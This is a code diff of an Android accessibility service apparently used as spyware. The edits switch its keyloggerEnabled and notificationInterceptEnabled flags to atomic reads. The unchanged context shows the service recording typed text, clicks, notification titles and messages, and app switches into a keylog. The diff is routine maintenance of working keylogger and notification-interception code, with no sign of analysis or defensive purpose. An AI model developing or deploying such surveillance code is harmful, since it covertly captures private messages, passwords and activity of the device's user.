@@ -174,8 +174,8 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
-        if (!keyloggerEnabled) return
-        
+        if (!keyloggerEnabled.get()) return
+
         textEventCount++
         
         try {
@@ -240,7 +240,7 @@ class MyAccessibilityService : AccessibilityService() {
         clickEventCount++
         lastEventType = "click"
         
-        if (!keyloggerEnabled) return
+        if (!keyloggerEnabled.get()) return
         
         try {
             val text = event.text?.joinToString("") ?: ""
@@ -277,7 +277,7 @@ class MyAccessibilityService : AccessibilityService() {
     private fun handleNotificationEvent(event: AccessibilityEvent, packageName: String) {
         notificationEventCount++
         
-        if (!notificationInterceptEnabled && !keyloggerEnabled) return
+        if (!notificationInterceptEnabled.get() && !keyloggerEnabled.get()) return
         
         try {
             val text = event.text?.joinToString("\n") ?: ""
@@ -301,7 +301,7 @@ class MyAccessibilityService : AccessibilityService() {
             }
             
             // Log notification if keylogger is active
-            if (keyloggerEnabled) {
+            if (keyloggerEnabled.get()) {
                 val notifText = buildString {
                     if (title.isNotEmpty()) append("[$title] ")
                     if (message.isNotEmpty()) append(message)
@@ -328,7 +328,7 @@ class MyAccessibilityService : AccessibilityService() {
             currentApp = packageName
             
             // Log app switch if keylogger active
-            if (keyloggerEnabled) {
+            if (keyloggerEnabled.get()) {
                 MonitorExecutor.appendKeylog(
                     packageName = packageName,
                     text = "[APP:$packageName]",
